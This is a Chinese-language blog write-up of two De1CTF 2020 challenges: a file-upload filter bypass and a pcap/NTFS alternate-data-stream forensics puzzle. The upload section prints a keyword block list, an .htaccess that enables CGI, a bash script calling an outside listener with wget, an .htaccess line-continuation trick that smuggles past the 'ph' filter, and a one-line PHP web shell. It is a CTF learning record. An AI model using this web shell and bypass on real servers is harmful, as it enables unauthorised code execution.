<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="De1CTF2020-WriteUp"><meta name="keywords" content="2020,De1CTF"><meta name="author" content="SNCKER"><meta name="copyright" content="SNCKER"><title>De1CTF2020-WriteUp | SNCKER's blog</title><link rel="shortcut icon" href="/blog/melody-favicon.ico"><link rel="stylesheet" href="/blog/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/blog/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.3.0'
} </script><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/blog/atom.xml" title="SNCKER's blog" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">2.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CheckIn"><span class="toc-number">2.1.</span> <span class="toc-text">CheckIn</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-Chowder"><span class="toc-number">3.1.</span> <span class="toc-text">Misc_Chowder</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="http://q1.qlogo.cn/g?b=qq&amp;nk=948375961&amp;s=640"></div><div class="author-info__name text-center">SNCKER</div><div class="author-info__description text-center"></div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/SNCKER">Follow</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/blog/archives"><span class="pull-left">文章</span><span class="pull-right">22</span></a><a class="author-info-articles__tags article-meta" href="/blog/tags"><span class="pull-left">标签</span><span class="pull-right">24</span></a><a class="author-info-articles__categories article-meta" href="/blog/categories"><span class="pull-left">分类</span><span class="pull-right">8</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://lkerenl.github.io/">lkerenl</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://sivona.top/">sivona</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://c1everf0x.github.io/">C1everf0x</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://www.n0puple.com/">winS0cks</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.cnblogs.com/lnjoy/">lnjoy</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.cnblogs.com/lktop/">lktop</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://www.nuclear.ink/">核平先生</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://foubean.github.io/">foubean</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://caddyetui.github.io/">caddyetui</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://sapphire037.github.io/">Sapphire</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://je1ly-xxn.github.io/">Je1ly</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://gitee.com/sncker/resource/raw/master/image/20210101131325.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/blog/">SNCKER's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/blog/">主页</a><a class="site-page" href="/blog/archives">文章</a><a class="site-page" href="/blog/categories">分类</a><a class="site-page" href="/blog/tags">标签</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">De1CTF2020-WriteUp</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-05</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/blog/categories/CTF/">CTF</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/blog/categories/CTF/WriteUp/">WriteUp</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前两天的自闭De1CTF我只想说，真的太棒了，题目质量很高，水准真的没得说，学到不少东西。也看到了一些国外著名战队，膜拜一下，白天国内师傅疯狂上分，半夜又轮到国外的师傅，很激烈。当然国内外都有师傅通宵干哈哈哈。<br>相比之下ISCC2020我也没啥好说的了，国内的CTF环境真的是个迷。不管怎样，还是希望国内这一块越走越好吧。不过起码De1CTF还是咱们国内的社区承办的<br>然后博主也是很有自知之明，去当个分母而已，就死磕最多人解出的两道题（非签到），其它的看都不看了just do it。  </p>
<a id="more"></a>

<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200505205921.png" alt=""><br>一道上传题。<br>简单的测了一下过滤。<br>首先文件名过滤ph。<br>文件内容过滤perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!<br>然后也通过Content-Type判断文件格式。<br>发现环境是  </p>
<blockquote>
<p>Server: Apache/2.4.6 (CentOS) PHP/5.4.16</p>
</blockquote>
<p>找了一下存在CVE-2017-15715漏洞，但是不顶用，因为ph被过滤了。<br>最后就是改Content-Type: image/jpeg就可以上传任意文件了，但是内容被限制了，像php这种也是被过滤的。<br>就想到短标签，采用&lt;?。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505211036.png" alt=""><br>然后就是解析，首先这里是没有明显的可以用来包含的地方。然后因为可以上传任意文件，就想到了用.htaccess来解析。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505211415.png" alt=""><br>但是，改解析的内容也包含了php，传不上去。。。<br>哭了，疯狂地搜索htaccess的奇淫技巧，看到了一篇利用htaccess调用CGI执行命令的文章。<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/218495.html">https://www.freebuf.com/vuls/218495.html</a><br>然后看到过滤里是没有bash的，兴奋起来了。<br>按照文章的思路测试<br>上传.htaccess</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options ExecCGI</span><br><span class="line">AddHandler cgi-script .xx</span><br></pre></td></tr></table></figure>
<p>再上传1.xx，要验证命令是否执行，我用wget来请求我的监听服务器。  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">wget 111.111.111.111:12345</span><br></pre></td></tr></table></figure>
<p>访问1.xx<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505212523.png" alt=""><br>500了，服务器监听也没结果。然后我上传一张正常的图片，正常访问，说明.htaccess文件格式没错。<br>那是不是没有wget呢，于是我又测试了nc，一样没反应。同样的也测试了FastCGI，都不行。然后就放弃了这条思路，和胜利擦肩而过，回想一下这点错就错在使用了不靠谱的方法来检验命令执行。<br>回到解析的思路上，因为前面有CVE-2017-15715的换行绕过黑名单，所以这里想到这个htaccess可以不可以用换行来绕过过滤。<br>于是我尝试了直接回车换行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-p</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure>
<p>以及插入一个0x0A。区别就是直接在内容中回车是回车换行\r\n两个字节也就是0x0D和0x0A，直接插入0x0A就只是换行。<br>但是都不行，全部500了，说明格式错误了。到这里是彻底放弃了。又和胜利擦肩而过，但凡再搜一下htaccess的换行方式也不会这么惨了哈哈。。<br>然后接下来是别人的wp了orz，先说预期解。<br>预期解还真是用CGI调用来执行命令。先看一个比较正规的CGI编程解。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">echo &quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;</span><br><span class="line">echo &quot;&quot; #空行，结束头</span><br><span class="line">echo cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<p>反正我是复现不出来，依旧500。<br>但是有个国外的师傅发现虽然是500状态码，但是命令已经执行了，他利用的是touch 123.txt，然后访问发现确实创建了文件最后通过cp /flag ./flag.txt获取flag。但我按照他的思路也复现不了，不过还是不得不佩服一下，毕竟自己没想到这个简单的验证思路。<br>然后就是非预期解了，这个是真的可惜。<br>非预期确确实实是htaccess换行绕过，但是却是这样的。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-p\</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure>
<p>真的自闭了啊。<br>然后复现也踩坑了，短标签&lt;?是不解析的，linux下默认关闭，但win是默认开启的。搞得我一度怀疑自己被针对。但是&lt;?=是可以解析的。  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>assert(<span class="variable">$_POST</span>[<span class="string">&quot;test&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p>我也不知道为啥我的@eval也用不了，真的脸太黑了？唉T.T<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505222840.png" alt=""><br>最后没啥好说的了。通读三篇官方文档，做了一点点测试和总结。<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/configuration.file.per-user.php">https://www.php.net/manual/zh/configuration.file.per-user.php</a><br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.basic-syntax.phptags.php">https://www.php.net/manual/zh/language.basic-syntax.phptags.php</a><br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag">https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag</a><br>首先短标签是需要开启short_open_tag的，linux默认是关闭的，但是php5.4后&lt;?=短标签总是可用的，而&lt;?则受这项设置影响。<br>因为有参考一道类似题，SUCTF2019的同名题，所以我想到了既然可以上传任意文件，那我是否可以上传.user.ini来开启短标签呢？但是测试不成功，我从官方文档找到失败的可能原因就是php.ini里的一项设置。  </p>
<blockquote>
<p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。 </p>
</blockquote>
<p>也就是说.user.ini并不是实时生效的，而题目的环境5分钟重置一次，所以很难验证。<br>官方文档有说，apache的htaccess可以达到.user.ini的同样效果，经过我的搜索，找到了php_value的设置方法。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value short_open_tag 1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/sncker/resource/raw/master/image/20200505223214.jpg" alt=""></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Misc-Chowder"><a href="#Misc-Chowder" class="headerlink" title="Misc_Chowder"></a>Misc_Chowder</h2><p>下放文件也是用的googledrive。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505180223.png" alt=""><br>下载下来是一个Misc_Chowder.pacp流量包，直接WireShark分析。过滤出http，发现上传动作。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505191751.png" alt=""><br>看到在120开头的ip里上传了6次图片，1.jpg,2.jpg…<br>还原出来1.jpg发现是正常图片，感觉是干扰的，然后在流量末尾发现往另一个ip上传一张7.png<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505192335.png" alt=""><br>还原出来是一个网盘的链接的图片。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505192728.png" alt=""><br>提取网站下载文件，一个readme.zip，里面有一个readme.docx，打开看一下只有两个表情包。。。这个也没啥考点了，改zip后缀用压缩程序打开。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505193452.png" alt=""><br>提取出压缩包，里面是一张图片，发现加密。根据举办方的hint，按格式DE****进行破解，跑了20多分钟得到密码：DE34Q1<br>解压得到图片。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505193823.png" alt=""><br>。。。。。。看了一下这张图片大小有28k，用binwalk看一下。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505194238.png" alt=""><br>有个RAR压缩包，加个e参数分解一下。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505194444.png" alt=""><br>RAR里两个txt都没用，fake flag。<br>然后就是第一大坑。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505194734.png" alt=""><br>这张写着“I AM FLAG”的666.jpg，它其实是一张png，让我一度认为flag在它这里，我一顿分析，各种常规套路都试了。<br>最后挂在这里了。后来看师傅们的wp，竟然是ADS隐写。。。<br>回到RAR压缩包，重新审视这个RAR，用winhex打开。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505201053.png" alt=""><br>在末尾可以发现一个fffffffflllll.txt的文件名，这个STM是NTFS ADS的一种标记头，ADS的格式都是”宿主文件”:”附属文件”，dir /r才可以看到。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505201632.png" alt=""></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad <span class="number">666</span>.jpg:fffffffflllll.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/sncker/resource/raw/master/image/20200505201905.png" alt=""><br>最后说一下第二大坑，测试发现只有用winrar解压出来才能还原出这个交换数据流。orz</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">SNCKER</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://sncker.github.io/blog/2020/05/05/De1CTF-2020-WriteUp/">https://sncker.github.io/blog/2020/05/05/De1CTF-2020-WriteUp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://sncker.github.io/blog">SNCKER's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/blog/tags/2020/">2020</a><a class="post-meta__tags" href="/blog/tags/De1CTF/">De1CTF</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/blog/2020/05/26/BJD3rnd-DASCTF-WriteUp/"><i class="fa fa-chevron-left">  </i><span>BJD3rd&amp;DASCTF-WriteUp</span></a></div><div class="next-post pull-right"><a href="/blog/2020/04/25/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCTF-WriteUp/"><span>攻防世界CTF-WriteUp</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://gitee.com/sncker/resource/raw/master/image/20210101131325.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By SNCKER</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/blog/js/utils.js?version=1.9.0"></script><script src="/blog/js/fancybox.js?version=1.9.0"></script><script src="/blog/js/sidebar.js?version=1.9.0"></script><script src="/blog/js/copy.js?version=1.9.0"></script><script src="/blog/js/fireworks.js?version=1.9.0"></script><script src="/blog/js/transition.js?version=1.9.0"></script><script src="/blog/js/scroll.js?version=1.9.0"></script><script src="/blog/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>